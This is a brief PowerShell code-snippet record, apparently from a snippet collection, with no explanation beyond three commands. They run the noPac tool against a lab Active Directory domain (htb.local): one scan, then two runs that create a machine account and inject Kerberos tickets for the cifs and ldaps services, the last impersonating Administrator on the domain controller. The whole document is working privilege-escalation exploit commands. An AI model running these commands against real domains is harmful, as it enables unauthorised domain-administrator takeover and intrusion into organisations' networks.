---
id: aa1d65c0-eabd-4b3b-ab40-7363585be035
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:03.185702+00:00'
updated_at: '2023-04-10T20:36:11.700422+00:00'
---

# Code Snippet aa1d65c0

**Language**: Powershell

```powershell
noPac.exe scan -domain htb.local -user user -pass 'password123'
noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
```
